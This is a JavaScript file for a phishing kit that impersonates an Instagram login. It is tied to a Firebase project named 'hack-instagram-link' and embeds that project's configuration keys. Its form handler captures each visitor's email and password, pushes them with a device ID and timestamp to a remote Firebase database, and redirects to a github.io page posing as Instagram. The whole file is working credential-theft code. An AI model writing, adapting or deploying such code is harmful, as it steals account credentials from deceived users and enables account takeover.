// Firebase Imports
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-analytics.js";

// Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyDsS14QF70TAtRSiXeDz00wLoI4FqaNo_8",
  authDomain: "hack-instagram-link.firebaseapp.com",
  databaseURL: "https://hack-instagram-link-default-rtdb.firebaseio.com",
  projectId: "hack-instagram-link",
  storageBucket: "hack-instagram-link.firebasestorage.app",
  messagingSenderId: "854965005132",
  appId: "1:854965005132:web:266c78e585bb28e219fde9",
  measurementId: "G-55BMTQLBKT"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const database = getDatabase(app);

// Function to generate a unique device ID
function generateUniqueId() {
  return Math.random().toString(36).substr(2, 9); // Example: "4tub132ze"
}

// Function to get or generate the device ID
function getDeviceId() {
  let deviceId = localStorage.getItem("deviceId");
  if (!deviceId) {
    deviceId = generateUniqueId(); // If not found, generate one
    localStorage.setItem("deviceId", deviceId);  // Save it in localStorage
  }
  return deviceId;
}

// Handle form submission
const loginForm = document.getElementById('loginForm');
if (loginForm) {
  loginForm.addEventListener('submit', (event) => {
    event.preventDefault();

    // Get form values  
    const email = document.getElementById('email').value;  
    const password = document.getElementById('password').value;  

    if (email && password) {  
      const deviceId = getDeviceId(); // Get or generate deviceId  

      // Ensure deviceId is valid before proceeding  
      if (!deviceId) {  
        alert("Device ID is invalid.");  
        return;  
      }  

      console.log("Generated Device ID:", deviceId);  

      // Create a reference to the "users" list (without وضع deviceId كمفتاح رئيسي)
      const usersRef = ref(database, 'users');  

      // Push a new login entry with deviceId inside the data object
      push(usersRef, {  
        deviceId: deviceId,  // وضع الجهاز داخل البيانات  
        email: email,  
        password: password,  
        timestamp: new Date().toISOString() // Add a timestamp to distinguish the logins  
      })  
      .then(() => {  
        const link = "https://mafia749.github.io/login/Instagram/instagram.html?id=" + deviceId;  
        alert("Login successful! Your link: " + link);  
        console.log("Generated Link:", link);  
        window.location.href = link; // Redirect the user to the generated link  
      })  
      .catch((error) => {  
        console.error("Error sending data to Firebase:", error.message);  
        alert("Error sending data: " + error.message); // Alert the user about the error  
      });  
    } else {  
      alert("Please fill in both fields.");  
    }

  });
} else {
  console.error("Login form not found!");
}
